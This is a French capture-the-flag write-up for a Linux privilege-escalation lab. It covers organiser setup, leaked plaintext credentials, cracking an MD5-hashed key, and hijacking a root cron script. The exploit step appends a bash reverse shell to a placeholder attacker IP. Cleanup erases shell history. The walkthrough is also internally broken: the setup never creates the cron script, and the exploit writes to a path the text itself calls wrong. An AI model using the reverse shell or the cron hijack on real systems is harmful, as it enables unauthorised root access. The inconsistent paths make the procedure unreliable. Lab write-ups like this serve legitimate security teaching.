# Write-up — Herald-7
**CryptAbyss CTF 2026 | Categorie : Linux Privilege Escalation**

---

## Informations du challenge

| Champ | Detail |
|---|---|
| Nom | Herald-7 |
| Vaisseau | HERALD-7 |
| Technique | Crontab — Pivot utilisateur + Script writable par groupe |
| CVSS | N/A — Mauvaise configuration |
| Difficulte | Facile-Moyen |
| Categorie | System |
| Auteur | Jeffrey JOANNEN / System |

---

## Description

> Un script appartenant a `root` s'execute automatiquement sur HERALD-7. L'administrateur a « oublie » de proteger ce script en ecriture… mais pas complètement.
>
> Vous devrez peut-être trouver un autre angle d'approche avant de pouvoir l'exploiter.

**Accès fourni :**
```
User : operative
Pass : h3r4ld-breach
```

---

## Mise en place de l'environnement (organisateurs)

### Creation des utilisateurs, du groupe et des flags

```bash
# Utilisateur joueur
useradd -m -s /bin/bash operative
echo "operative:h3r4ld-breach" | chpasswd

# Utilisateur de pivot
useradd -m -s /bin/bash scheduler
echo "scheduler:sch3d-m41nt4in" | chpasswd

# Groupe herald : seul scheduler en fait partie
groupadd herald
usermod -aG herald scheduler

# Flag final
echo "CryptAbyss{CR0N_S4CR1F1C3_H3R4LD_D35TR0Y3D}" > /root/flag.txt
chmod 400 /root/flag.txt
chown root:root /root/flag.txt

# Flag intermediaire 1 — clé faible hachée en MD5 (a casser) + flag chiffré avec cette clé
mkdir -p /var/herald/schedules

SCHEDULER_KEY='trustno1'

# Fichier A : hash MD5 de la clé — c'est lui qu'on crack (rockyou.txt, ~instantané)
echo -n "$SCHEDULER_KEY" | md5sum | awk '{print $1}' > /var/herald/schedules/.patrol_key.txt
chmod 644 /var/herald/schedules/.patrol_key.txt

# Fichier B : le flag, chiffré avec cette clé une fois retrouvée
echo -n "CryptAbyss{SCH3DUL3R_L0C4T3D_T1M3R_4CT1V3}" \
    | openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -a -pass pass:"$SCHEDULER_KEY" \
    > /var/herald/schedules/.patrol_flag.txt
chmod 644 /var/herald/schedules/.patrol_flag.txt

# Fichier de config contenant les creds de scheduler (lisible par operative)
mkdir -p /opt/.herald
cat > /opt/.herald/system.conf << 'CONF'
[daemon]
interval     = 60
log_path     = /var/herald/schedules/patrol_log.txt
script_path  = /opt/scripts/patrol.sh

[maintenance]
# TODO : changer ce mot de passe avant la mise en production
maint_user   = scheduler
maint_pass   = sch3d-m41nt4in

[security]
run_as       = root
CONF
chown root:operative /opt/.herald/system.conf
chmod 640 /opt/.herald/system.conf


chown root:herald /opt/.scripts/patrol.sh
chmod 770 /opt/.scripts/patrol.sh

# Entree crontab
echo "* * * * * root /opt/.scripts/patrol.sh" >> /etc/crontab

# Lore
cat > /home/operative/.herald_log.txt << 'LORE'
[ JOURNAL DE BORD INTERNE — VAISSEAU HERALD-7 ]

Cycle 2094.18 — Rapport d'anomalie système :
  Des cycles de patrouille automatisés ont été détectés.
  Exécutés par : ********
  Script de patrouille : *************

  Note du technicien #087 :
  "Les permissions du script ont été élargies pour faciliter
   la maintenance."
   — Technicien #087, cycle 2094.19

[ FIN DU JOURNAL ]
LORE
chown operative:operative /home/operative/.herald_log.txt
chmod 600 /home/operative/.herald_log.txt

# Demarrage cron
service cron start 2>/dev/null || systemctl start cron 2>/dev/null || true
```

Verifications :
```bash
ls -la /opt/.scripts/patrol.sh
# -rwxrwx--- root herald ... /opt/.scripts/patrol.sh

ls -la /opt/.herald/system.conf
# -rw-r----- root operative ... /opt/.herald/system.conf

id scheduler
# uid=1002(scheduler) gid=1002(scheduler) groups=1002(scheduler),1003(herald)
```

---

## Write-up — Resolution pas a pas

### etape 1 — Connexion et reconnaissance initiale

```bash
id
# uid=1001(operative) gid=1001(operative) groups=1001(operative)

sudo -l
# User operative may not run sudo on herald-7.

# Lire le lore pour des indices
cat ~/.herald_log.txt
# → Mentionne des cycles automatises et un script de patrouille, executants masques
```

Pas de sudo. On enumère le système de fichiers a la recherche d'informations, y compris les fichiers cachés.

### etape 2 — Decouverte du fichier de configuration

```bash
find /opt -readable -type f 2>/dev/null
# /opt/.herald/system.conf   ← fichier de config caché, lisible par operative

cat /opt/.herald/system.conf
```

Resultat :
```ini
[daemon]
interval     = 60
log_path     = /var/herald/schedules/patrol_log.txt
script_path  = /opt/scripts/patrol.sh

[maintenance]
# TODO : changer ce mot de passe avant la mise en production
maint_user   = scheduler
maint_pass   = sch3d-m41nt4in

[security]
run_as       = root
```

Des identifiants en clair pour le compte `scheduler`. *(Les chemins indiqués dans le fichier — `/opt/scripts/...` — n'ont pas le point caché : c'est le fichier de config qui est trompeur, les vrais chemins sur le disque sont `/opt/.herald/` et `/opt/.scripts/`.)*

On recupère egalement le flag intermediaire 1, en deux temps. D'abord la clé, hachée en MD5 :

```bash
find /var/herald -type f 2>/dev/null
# /var/herald/schedules/.patrol_key.txt
# /var/herald/schedules/.patrol_flag.txt

cat /var/herald/schedules/.patrol_key.txt
# 5fcfd41e547a12215b173ff47fdd3739
```

C'est un hash MD5 d'un mot de passe **court et faible** (contrairement au flag lui-même, qui est trop long pour être bruteforcé). On le casse avec Hashcat ou John the Ripper en quelques secondes via une wordlist usuelle (rockyou.txt) :

```bash
hashcat -m 0 -a 0 patrol_key.txt /usr/share/wordlists/rockyou.txt
# ou
john --format=raw-md5 patrol_key.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Résultat : `trustno1`

On utilise cette clé pour déchiffrer le second fichier, qui contient le flag chiffré :

```bash
cat /var/herald/schedules/.patrol_flag.txt
# U2FsdGVkX1...  (chiffré AES-256-CBC)

openssl enc -d -aes-256-cbc -pbkdf2 -iter 100000 -a \
    -in /var/herald/schedules/.patrol_flag.txt \
    -pass pass:'trustno1'
# CryptAbyss{SCH3DUL3R_L0C4T3D_T1M3R_4CT1V3}
```

### etape 3 — Pivot vers scheduler

```bash
su scheduler
# Password: sch3d-m41nt4in

id
# uid=1002(scheduler) gid=1002(scheduler) groups=1002(scheduler),1003(herald)
```

Le compte `scheduler` appartient au groupe `herald`.

### etape 4 — Identification de la surface d'attaque

```bash
cat /etc/crontab
# * * * * * root /opt/.scripts/patrol.sh

ls -la /opt/.scripts/patrol.sh
# -rwxrwx--- 1 root herald ... /opt/.scripts/patrol.sh
```

Le script est execute **chaque minute par root** et est **modifiable par le groupe herald** — dont fait partie `scheduler`. C'est la faille.

### etape 5 — Comprehension de la vulnerabilite

Le script `/opt/.scripts/patrol.sh` appartient a `root` et est lance automatiquement par root via le crontab système. Ses permissions `770` avec le groupe `herald` permettent a tout membre de ce groupe de le modifier. En injectant une commande, elle sera executee avec les droits root au prochain cycle.

### etape 6 — Exploitation

**Sur la machine d'attaque (listener) :**

```bash
nc -lvnp 4444
```

**Sur la machine victime (en tant que scheduler) :**

```bash
echo "bash -i >& /dev/tcp/<VOTRE_IP>/4444 0>&1" >> /opt/scripts/patrol.sh
```

Moins d'une minute plus tard, le crontab execute le script modifie et envoie un reverse shell root.

### etape 7 — Obtention du flag

Dans le listener Netcat :

```bash
whoami
# root

cat /root/flag.txt
```

**Flag :** `CryptAbyss{CR0N_S4CR1F1C3_H3R4LD_D35TR0Y3D}`

---

## Resume de l'attaque

```
operative (uid=1001)
    ↓ find /opt -readable → /opt/.herald/system.conf (caché)
    ↓ cat system.conf → creds scheduler:sch3d-m41nt4in
    ↓ find /var/herald → .patrol_key.txt (hash) + .patrol_flag.txt (chiffré)
    ↓ crack MD5 (hashcat/rockyou) → clé "trustno1"
    ↓ openssl enc -d avec "trustno1" → flag intermediaire 1
    ↓ su scheduler → groupe herald
scheduler (uid=1002, groupe herald)
    ↓ cat /etc/crontab → /opt/.scripts/patrol.sh execute par root toutes les minutes
    ↓ ls -la patrol.sh → chmod 770 root:herald → writable par scheduler
    ↓ echo reverse shell >> /opt/.scripts/patrol.sh
    ↓ attente < 1 minute → cron execute le script modifie
root reverse shell (uid=0)
    ↓ cat /root/flag.txt
CryptAbyss{CR0N_S4CR1F1C3_H3R4LD_D35TR0Y3D}
```

---

## Nettoyage (post-CTF)

```bash
# Restaurer le script original
cat > /opt/.scripts/patrol.sh << 'SH'
#!/bin/bash
echo "HERALD-7 patrol cycle complete" >> /var/herald/schedules/patrol_log.txt
SH
chown root:herald /opt/.scripts/patrol.sh
chmod 770 /opt/.scripts/patrol.sh

# Effacer l'historique
history -c && rm ~/.bash_history
```

---

## Flags

| Flag | Valeur | Forme déposée sur le disque |
|---|---|---|
| Intermediaire 1 | `CryptAbyss{SCH3DUL3R_L0C4T3D_T1M3R_4CT1V3}` | Chiffré AES-256-CBC dans `/var/herald/schedules/.patrol_flag.txt` ; clé `trustno1` hachée en MD5 dans `/var/herald/schedules/.patrol_key.txt` (crackable via John/Hashcat) |
| Final | `CryptAbyss{CR0N_S4CR1F1C3_H3R4LD_D35TR0Y3D}` | En clair dans `/root/flag.txt` |

---

## References

- [HackTricks — Cron jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs)
- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
